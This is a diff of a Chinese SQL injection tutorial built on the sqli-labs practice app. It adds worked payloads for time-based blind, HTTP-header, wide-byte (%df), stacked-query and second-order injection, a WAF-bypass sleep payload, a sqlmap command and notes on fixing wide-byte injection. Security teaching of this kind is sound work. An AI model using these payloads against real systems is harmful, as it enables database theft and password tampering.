@@ -365,7 +365,7 @@ and updatexml(1,concat('^',(需要查询的内容),'^'),1)
 
 源码如下
 
-```php
+```
 $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1 ";
 $result=mysql_query($sql);
 $row = mysql_fetch_array($result);
@@ -394,7 +394,7 @@ $row = mysql_fetch_array($result);
 * SQLServer         sysobjects
 用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库
 
-```sql
+```
 //判断是否是 Mysql数据库
 http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from information_schema.tables) --+
 //判断是否是 access数据库
@@ -410,7 +410,7 @@ http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from sysobjects) --+
 
 2. 判断当前数据库名
 
-```sql
+```
 1：判断当前数据库的长度，利用二分法
 http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>5 --+  //正常显示
 http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>10 --+  //不显示任何数据
@@ -432,7 +432,7 @@ http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),3,1))>100 --+
 
 3. 判断当前库的表名
 
-```sql
+```
 //猜测当前数据库中是否存在admin表
 http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from admin) --+
 1：判断当前数据库中表的个数
@@ -454,13 +454,13 @@ http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from inf
 由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断
 ```
 
-4. 判断表的字段
+1. 判断表的字段
 
 * 判断字段个数
 * 判断每个字段的长度
 * 猜每个字段的字符
 
-```sql
+```
 //如果已经证实了存在admin表，那么猜测是否存在username字段
 http://127.0.0.1/sqli/Less-5/?id=1' and exists(select username from admin) 
   
@@ -489,7 +489,7 @@ http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from in
 * 猜字段中数据的长度
 * 猜字段数据的每个字符ascii码 得字符
 
-```sql
+```
 我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据
  
 1: 判断数据的长度
@@ -507,3 +507,316 @@ http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit
 ```
 
 一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。
+
+### 基于时间的盲注
+
+也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用“绝招”--延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id=1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323093339458.png)
+
+1. 延时注入
+
+```
+?id=1' and sleep(5) --+   
+```
+
+如图所示，观察请求的时间线，大概在5秒以上，说明构造的sleep(5) 语句起作用，可以把这个时间线作为sql 注入的判断依据。
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323093826373.png)
+
+2. 获取数据库名字
+
+延时注入与布尔盲注类似，构造方法如下，提交参数
+```
+?id=1' and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+
+```
+> if(expr1,expr2,expr3)       如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。 传送门-》[mysql基础学习](https://blog.csdn.net/qq_44159028/article/details/114327303?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646302616780261917189%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646302616780261917189&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114327303.pc_v1_rank_blog_v1&utm_term=mysql)
+
+代码的含义就是如果数据库名字的第一个字符的acsii值为115，则进行延时，否则返回0即什么都不返回。
+
+页面显示延时5 秒，说明数据库名字第一个字母的ASCII 值是115，也就是字母s。
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323094248951.png)
+
+3. 数据库名字第二个字母的判断，
+```
+?id=1' and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+
+```
+与盲注类似，后面就是猜数，这就是延时注入
+
+<font color=red>可以绕waf的payload</font>
+
+```
+and(select*from(select+sleep(4))a/**/union/**/select+1)='
+```
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323095412921.png)
+
+### HTTP头注入
+
+常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323100756615.png)
+
+产生注入的条件：
+
+- 能够对请求头消息进行修改
+
+- 修改的请求头信息能够带入数据库进行查询
+
+- 数据库没有对输入的请求信息做过滤
+
+#### 1. User-Agent注入
+
+User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。
+
+以sqli-labs less-18关为例，登录用户密码：dumb ,0
+
+1.1 判断注入点：user-agent值后面加上'，引发报错，确定存在sql注入
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101045836.png)
+
+1.2 采用报错注入函数获取当前数据库名
+
+```
+' and updatexml(1,concat('^',(database()),'^'),1) and '
+```
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101137486.png)
+
+#### 2. cookie注入
+
+cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。传送门-》[cookie](https://blog.csdn.net/qq_44159028/article/details/114359205?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646553116780266210214%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646553116780266210214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114359205.pc_v1_rank_blog_v1&utm_term=cookie) 。以sqli-labs less-20关为例，登录后
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101350105.png)
+
+2.1 首先判断注入点，加 ' 单引号报错
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101417342.png)
+
+2.2 采用报错注入函数获取当前数据库名
+
+```
+' and updatexml(1,concat('^',(database()),'^'),1) and '
+```
+
+#### 3. Referer注入
+
+Referer：是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。
+
+以19关为例
+
+1. 判断输入点，加单引号引发报错
+
+2. 使用报错注入函数：
+```
+‘ and updatexml(1,concat(0x7e,(database()),0x7e),0) and '
+```
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210323101809562.png)
+
+方法都是一样的。
+
+#### 4. X-Forwarded-For 注入
+
+X-Forwarded-For(XFF)：用来识别客户端最原始的ip地址。详见，传送门 -》X-Forwarded-For sql注入
+
+### 宽字节注入
+
+**宽字节案例引入**
+
+宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。为了说明宽字节注入问题，我们以SQLi-labs 32 关为例子。 使用?id=1' 进行测试的时候，发现提交的单引号会被转义[\']。此时，转义后的单引号会被作为普通字符带入数据库查询。也就是说，我们提交的单引号不会影响到原来SQL 语句的结构。
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210324174905605.png)
+
+接着我们查看这关的源码，发现传入的id经过addslashes转移函数的处理，所有的单引号双引号字符都会被添加转义字符。接着在带入到数据库查询前设置了mysql_query("SET NAMES gbk")，即设定字符集为gbk。漏洞就是由于这个设置导致宽字节注入。
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210820152802384.png)
+
+仔细看该函数，其利用正则匹配将 [ /，'，" ]这些三个符号都过滤掉了
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821102033527.png)
+
+关于preg_replace的正则用法可详看——> [命令执行与代码执行漏洞](https://blog.csdn.net/qq_44159028/article/details/114642034) 中搜索preg_replace 
+
+而我们要绕过这个转义处理，使单引号发挥作用不再被转义，有两个思路：
+
+1. 让斜杠（\）失去作用
+2. 让斜杠（\）消失
+
+第一个思路就是借鉴程序员的防范思路，对斜杠（\）转义，使其失去转义单引号的作用，成为普通的内容。第二个思路就是宽字节注入。
+
+**关于编码**
+
+在理解宽字节注入之前，我们需要先了解编码的有关知识，关于什么是编码，为什么要编码，可以详看 ——> [计算机中的编码问题](https://blog.csdn.net/qq_44159028/article/details/115201653)
+
+1. 某字符的大小为一个字节时，称其字符为窄字节.
+2. 当某字符的大小为两个字节时，称其字符为宽字节.
+3. 所有英文默认占一个字节，汉字占两个字节
+4. 常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等
+
+**宽字节注入**
+
+宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。
+
+由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的
+
+我们在前面加上 %df'  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c'，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df ' ,被认为運' ,成功消除了转义函数的影响。
+
+* '           %27
+* \           %5c
+* %df\'    %df%5c' =》  運'
+
+我们输入 ?id=1%df'，按道理来说将转义符吃掉了，结果应该是 id=' 運'  ' ，为什么这里转变成了中文后后面还有一个反斜杠了？那个反斜杠是哪里来的？
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821100701673.png)
+
+其实这个是浏览器显示编码的问题，我们将浏览器编码切换为GB2312即简体中文，如下就正常了。
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821100948766.png)
+
+联合注入如下
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210324175615607.png)
+
+**GB2312与GBK的不同**
+
+gb2312和gbk应该都是宽字节家族的一员。但我们来做个小实验。把源码中set names修改成gb2312
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821231155171.png)
+
+结果就不能注入了，我开始不信，然后再把数据库编码也改成gb2312，也是不成功的。虽然执行的语句还是显示被转换成了中文了，但就是注入不成功
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821232112841.png)
+
+为什么，这归结于gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。
+
+所以，把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有0x5c的编码，就可以进行宽字符注入。
+
+#### 宽字节注入注入方法
+
+##### 1. 黑盒
+
+就是上面所述的，在注入点后面加%df，然后按照正常的注入流程开始注入即可。如果我们需要使用sqlmap进行检测注入的话也需要在注入点后面加%df然后再用sqlmap跑，否则是注入不出来的，如
+
+```
+sqlmap.py -u "http://localhost/sqli-labs-master/Less-32/?id=1%df%27"
+```
+
+##### 2. 白盒
+
+查看mysql是否为GBK编码，且是否使用`preg_replace()`把单引号转换成\'或自带函数`addslashes()`进行转义
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821231155171.png)
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821232504840.png)
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821233043656.png)
+
+如果存在上面说的，则存在宽字节注入。
+
+#### 宽字节注入修复
+
+##### 1. mysql_real_escape_string
+
+听说这个函数能抵御宽字节注入攻击。mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集。mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集。
+
+‍于是，把addslashes替换成mysql_real_escape_string，来抵御宽字符注入。但是我们发现还是一样注入成功了
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821233922778.png)
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821233900317.png)
+
+为什么，明明我用了mysql_real_escape_string，但却仍然不能抵御宽字符注入？
+
+原因就是，你没有指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍
+
+> mysqli_set_charset(connection,charset);
+
+|参数	|描述|
+|---|---|
+|connection	|必需。规定要使用的 MySQL 连接。|
+|charset|	必需。规定默认字符集。|
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821234529785.png)
+
+这样就防止了注入
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210821234552955.png)
+
+1. 先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string来过滤用户输入。
+
+2. 设置参数,character_set_client=binary
+
+3. 使用utf-8编码
+
+### 堆叠查询
+
+堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325120628613.png)
+
+执行
+
+`id=1';update users set password='123456' where id=1; --+ `
+
+意思就是再更新id=1的用户密码为123456。如下成功执行了更新密码的语句
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325120909611.png)
+
+#### 堆叠查询的局限性
+
+堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息
+
+### 二阶注入
+
+二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。
+
+1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。
+2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。
+3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。
+4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。
+5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功
+
+总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。以sqli-labs第24关为例
+
+#### sqli-labs less-24
+
+1. 如下点击注册用户
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325171938838.png)
+
+这里注册用户名为 admin'#
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/2021032517204294.png)
+
+此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是DDD
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325172142765.png)
+
+2. 对注册的账号进行登录然后修改密码为ccccc
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325172253439.png)
+
+此时提示密码已经成功修改了
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325172320556.png)
+
+此时我们发现反倒是admin的密码被修改成了ccccc，而我们注册的用户admin'#的密码并没有被修改
+
+![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325172540390.png)
+
+##### 漏洞原因
+
+1. 在进行用户注册的允许存在'和#这种特殊字符
+
+2. 在修改密码页面的源码中，发现这里很明显存在注入漏洞
+
+`$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";`
+
+当我们登录账号admin'#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为ccccc
+
+`$sql = "UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass' ";`
+
+六、sql注入getshell的几种方式
+传送门 -》[sql注入getshell的几种方式](https://blog.csdn.net/qq_44159028/article/details/116274542)
